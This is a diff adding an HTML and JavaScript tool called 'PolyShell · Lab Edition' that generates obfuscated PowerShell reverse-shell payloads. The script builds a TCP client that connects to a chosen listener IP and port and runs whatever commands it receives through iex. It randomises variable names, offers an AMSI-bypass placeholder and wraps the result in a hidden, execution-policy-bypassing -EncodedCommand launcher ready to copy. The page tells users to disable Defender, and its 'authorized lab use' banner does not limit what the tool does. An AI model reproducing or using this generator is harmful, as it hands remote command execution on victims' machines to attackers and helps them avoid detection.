@@ -1,0 +1,425 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>PolyShell · Lab Edition</title>
+    <style>
+        * { margin:0; padding:0; box-sizing:border-box; }
+        body {
+            background: linear-gradient(145deg, #0a0e1a 0%, #060a12 100%);
+            font-family: 'Inter', system-ui, -apple-system, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            color: #e2e9ff;
+        }
+        .shell-card {
+            max-width: 1180px;
+            width: 100%;
+            background: #111827;
+            border-radius: 24px;
+            border: 1px solid #2a3a5a;
+            box-shadow: 0 25px 60px -10px rgba(0,0,0,0.8);
+            overflow: hidden;
+        }
+        .header {
+            background: #0d1525;
+            padding: 28px 32px;
+            display: flex;
+            align-items: center;
+            gap: 20px;
+            flex-wrap: wrap;
+            border-bottom: 1px solid #1a2a44;
+        }
+        .logo-icon {
+            font-size: 32px;
+            font-weight: 700;
+            background: linear-gradient(135deg, #60a5fa, #a78bfa);
+            -webkit-background-clip: text;
+            color: transparent;
+            padding: 8px 16px;
+            border-radius: 12px;
+            border: 1px solid #2a3a5a;
+            background-color: #0a0f1e;
+        }
+        .title {
+            font-size: 2.0rem;
+            font-weight: 700;
+            background: linear-gradient(90deg, #60a5fa, #a78bfa, #f472b6);
+            -webkit-background-clip: text;
+            color: transparent;
+        }
+        .subtitle {
+            font-size: 0.9rem;
+            color: #94a3b8;
+            margin-top: 2px;
+        }
+        .tag {
+            background: #1a2a44;
+            color: #93c5fd;
+            padding: 6px 16px;
+            border-radius: 9999px;
+            font-size: 0.8rem;
+            border: 1px solid #2a4a6a;
+            font-family: 'Fira Code', monospace;
+        }
+        .input-area {
+            padding: 32px;
+            background: #0d1525;
+        }
+        .input-row {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 24px;
+            margin-bottom: 24px;
+        }
+        .label {
+            display: block;
+            margin-bottom: 8px;
+            font-size: 0.8rem;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            color: #94a3b8;
+            font-weight: 600;
+        }
+        input, select {
+            width: 100%;
+            background: #0a0f1e;
+            border: 2px solid #1a2a44;
+            border-radius: 12px;
+            padding: 14px 20px;
+            font-size: 1.1rem;
+            color: white;
+            font-family: 'Fira Code', monospace;
+            transition: border-color 0.3s;
+        }
+        input:focus, select:focus {
+            border-color: #60a5fa;
+            outline: none;
+            box-shadow: 0 0 0 3px rgba(96, 165, 250, 0.1);
+        }
+        .controls {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 16px;
+            align-items: center;
+            margin: 20px 0;
+            padding: 16px;
+            background: #0a0f1e;
+            border-radius: 12px;
+            border: 1px solid #1a2a44;
+        }
+        .controls label {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 0.9rem;
+            color: #c8d6e5;
+            cursor: pointer;
+        }
+        .controls input[type="checkbox"] {
+            width: auto;
+            padding: 0;
+            margin: 0;
+            accent-color: #60a5fa;
+            transform: scale(1.1);
+        }
+        .btn {
+            padding: 12px 28px;
+            border-radius: 12px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s;
+            border: none;
+            font-size: 0.95rem;
+        }
+        .btn-primary {
+            background: linear-gradient(135deg, #60a5fa, #7c3aed);
+            color: white;
+            box-shadow: 0 4px 15px rgba(96, 165, 250, 0.3);
+        }
+        .btn-primary:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(96, 165, 250, 0.4);
+        }
+        .btn-secondary {
+            background: #1a2a44;
+            color: #e2e9ff;
+            border: 1px solid #2a3a5a;
+        }
+        .btn-secondary:hover {
+            background: #2a3a5a;
+            transform: translateY(-1px);
+        }
+        .output-box {
+            background: #0a0f1e;
+            border-radius: 12px;
+            padding: 20px;
+            margin-top: 16px;
+            border: 1px solid #1a2a44;
+            font-family: 'Fira Code', 'Consolas', monospace;
+            font-size: 0.82rem;
+            line-height: 1.6;
+            color: #e0e7ff;
+            white-space: pre-wrap;
+            overflow-x: auto;
+            max-height: 400px;
+            position: relative;
+        }
+        .output-header {
+            background: #0d1525;
+            padding: 10px 18px;
+            border-radius: 12px;
+            font-size: 0.85rem;
+            margin-bottom: 12px;
+            display: inline-flex;
+            align-items: center;
+            gap: 10px;
+            border: 1px solid #1a2a44;
+            font-weight: 600;
+            color: #94a3b8;
+        }
+        footer {
+            text-align: center;
+            padding: 20px;
+            font-size: 0.8rem;
+            color: #4a5a7a;
+            background: #0d1525;
+            border-top: 1px solid #1a2a44;
+            font-family: 'Fira Code', monospace;
+        }
+        .flash {
+            animation: flash 600ms ease;
+        }
+        @keyframes flash {
+            0%,100% { background: #0a0f1e; }
+            50% { background: #1a2a4a; }
+        }
+        .warning-box {
+            background: #1a2a1a;
+            border: 1px solid #4a7a4a;
+            border-radius: 12px;
+            padding: 16px;
+            margin: 16px 0;
+            color: #a0d0a0;
+            font-size: 0.9rem;
+        }
+        .warning-box strong {
+            color: #fbbf24;
+        }
+    </style>
+</head>
+<body>
+<div class="shell-card">
+    <div class="header">
+        <div class="logo-icon">⬡</div>
+        <div>
+            <div class="title">PolyShell</div>
+            <div class="subtitle">Lab Edition - Authorized Testing Only</div>
+        </div>
+        <div style="margin-left: auto; display: flex; gap: 8px; flex-wrap: wrap;">
+            <span class="tag">v2.1 Lab</span>
+            <span class="tag">Randomized</span>
+        </div>
+    </div>
+    <div class="input-area">
+        <div class="warning-box">
+            <strong> AUTHORIZED TESTING ONLY</strong><br>
+            Use exclusively in isolated lab environments you own/control. 
+            Unauthorized use is illegal. Test with Defender disabled or excluded in your lab VM.
+        </div>
+
+        <div class="input-row">
+            <div>
+                <div class="label">Listener Address</div>
+                <input type="text" id="ip" placeholder="192.168.45.45" value="192.168.45.217">
+            </div>
+            <div>
+                <div class="label">Port</div>
+                <input type="text" id="port" placeholder="443" value="443">
+            </div>
+        </div>
+
+        <div style="margin-bottom: 16px;">
+            <div class="label">Obfuscation Level</div>
+            <select id="obfLevel">
+                <option value="0">None</option>
+                <option value="1" selected>Light</option>
+                <option value="2">Medium</option>
+                <option value="3">Heavy (basic)</option>
+            </select>
+        </div>
+
+        <div class="controls">
+            <label><input type="checkbox" id="b64Mode" checked> Base64 Launcher</label>
+            <label><input type="checkbox" id="utf16Mode" checked> UTF-16LE</label>
+            <label><input type="checkbox" id="amsiBypass"> AMSI Placeholder</label>
+        </div>
+
+        <div class="btn-group" style="display:flex; gap:12px; flex-wrap:wrap;">
+            <button class="btn btn-primary" id="generateBtn">Generate Payload</button>
+            <button class="btn btn-secondary" id="copyObfuscatedBtn" disabled>Copy Launcher</button>
+            <button class="btn btn-secondary" id="copyReadableBtn" disabled>Copy Readable</button>
+            <button class="btn btn-danger" id="clearBtn">Clear</button>
+        </div>
+    </div>
+
+    <div style="padding:0 32px 20px;">
+        <div class="output-header"><span>Generated Launcher</span></div>
+        <div id="obfuscatedOutput" class="output-box">
+            <span style="color:#4a5a7a;">Click Generate...</span>
+        </div>
+    </div>
+
+    <div style="padding:0 32px 32px;">
+        <div class="output-header"><span>Readable PowerShell</span></div>
+        <div id="decodedOutput" class="output-box">
+            <span style="color:#4a5a7a;">Readable version appears here...</span>
+        </div>
+    </div>
+
+    <footer>
+        Authorized Lab Use Only • For educational red team exercises
+    </footer>
+</div>
+
+<script>
+let generationCounter = 0;
+let currentReadable = '';
+let currentLauncher = '';
+
+function randVar(prefix = 'v') {
+    const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
+    let result = prefix;
+    for (let i = 0; i < 8; i++) {
+        result += chars[Math.floor(Math.random() * chars.length)];
+    }
+    return result;
+}
+
+function generatePayload(ip, port, obfLevel, useAmsi) {
+    const v1 = randVar(); // client
+    const v2 = randVar(); // stream
+    const v3 = randVar(); // buffer
+    const v4 = randVar(); // bytesRead
+    const v5 = randVar(); // cmd
+    const v6 = randVar(); // output
+
+    let amsiPart = '';
+    if (useAmsi) {
+        amsiPart = `# AMSI placeholder - replace with your lab-tested bypass\n`;
+    }
+
+    let shell = `${amsiPart}
+$${v1} = New-Object System.Net.Sockets.TCPClient('${ip}', ${port});
+$${v2} = $${v1}.GetStream();
+[byte[]]$${v3} = 0..65535|%{0};
+while(($${v4} = $${v2}.Read($${v3}, 0, $${v3}.Length)) -ne 0){
+    $${v5} = (New-Object System.Text.ASCIIEncoding).GetString($${v3},0, $${v4});
+    $${v6} = (iex $${v5} 2>&1 | Out-String);
+    $${v6} += "PS " + (pwd).Path + "> ";
+    $${v2}.Write([text.encoding]::ASCII.GetBytes($${v6}),0,$${v6}.Length);
+    $${v2}.Flush();
+}
+$${v1}.Close();`.trim();
+
+    // Apply basic obfuscation
+    if (obfLevel >= 2) {
+        shell = shell.replace(/\s+/g, ' ');
+    }
+    if (obfLevel >= 3) {
+        shell = shell.split('\n').join('; ');
+    }
+
+    return shell;
+}
+
+function toUtf16LEBase64(str) {
+    let utf16 = '';
+    for (let i = 0; i < str.length; i++) {
+        utf16 += String.fromCharCode(str.charCodeAt(i)) + '\0';
+    }
+    return btoa(utf16);
+}
+
+// DOM elements
+const generateBtn = document.getElementById('generateBtn');
+const obfuscatedOutput = document.getElementById('obfuscatedOutput');
+const decodedOutput = document.getElementById('decodedOutput');
+const copyObfuscatedBtn = document.getElementById('copyObfuscatedBtn');
+const copyReadableBtn = document.getElementById('copyReadableBtn');
+const clearBtn = document.getElementById('clearBtn');
+
+function handleGenerate() {
+    const ip = document.getElementById('ip').value.trim();
+    const port = document.getElementById('port').value.trim();
+    const level = parseInt(document.getElementById('obfLevel').value);
+    const useB64 = document.getElementById('b64Mode').checked;
+    const useUtf16 = document.getElementById('utf16Mode').checked;
+    const useAmsi = document.getElementById('amsiBypass').checked;
+
+    if (!ip || !port || isNaN(parseInt(port))) {
+        alert("Please enter valid IP and Port");
+        return;
+    }
+
+    generationCounter++;
+    let payload = generatePayload(ip, port, level, useAmsi);
+    currentReadable = payload;
+
+    let display = payload;
+
+    if (useB64) {
+        const encoded = useUtf16 
+            ? toUtf16LEBase64(payload) 
+            : btoa(unescape(encodeURIComponent(payload)));
+        display = `powershell -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand ${encoded}`;
+        currentLauncher = display;
+    } else {
+        currentLauncher = payload;
+    }
+
+    obfuscatedOutput.textContent = display;
+    decodedOutput.textContent = payload;
+
+    copyObfuscatedBtn.disabled = false;
+    copyReadableBtn.disabled = false;
+
+    // Flash effect
+    obfuscatedOutput.classList.add('flash');
+    decodedOutput.classList.add('flash');
+    setTimeout(() => {
+        obfuscatedOutput.classList.remove('flash');
+        decodedOutput.classList.remove('flash');
+    }, 600);
+}
+
+function copyToClipboard(text, btn) {
+    navigator.clipboard.writeText(text).then(() => {
+        const original = btn.textContent;
+        btn.textContent = 'Copied!';
+        setTimeout(() => btn.textContent = original, 1500);
+    });
+}
+
+generateBtn.addEventListener('click', handleGenerate);
+copyObfuscatedBtn.addEventListener('click', () => copyToClipboard(currentLauncher || obfuscatedOutput.textContent, copyObfuscatedBtn));
+copyReadableBtn.addEventListener('click', () => copyToClipboard(currentReadable, copyReadableBtn));
+clearBtn.addEventListener('click', () => {
+    obfuscatedOutput.textContent = 'Click Generate...';
+    decodedOutput.textContent = 'Readable version appears here...';
+    copyObfuscatedBtn.disabled = true;
+    copyReadableBtn.disabled = true;
+});
+
+document.getElementById('ip').addEventListener('keypress', e => { if (e.key === 'Enter') handleGenerate(); });
+document.getElementById('port').addEventListener('keypress', e => { if (e.key === 'Enter') handleGenerate(); });
+
+// Auto generate on load
+document.addEventListener('DOMContentLoaded', () => setTimeout(handleGenerate, 400));
+</script>
+</body>
+</html>
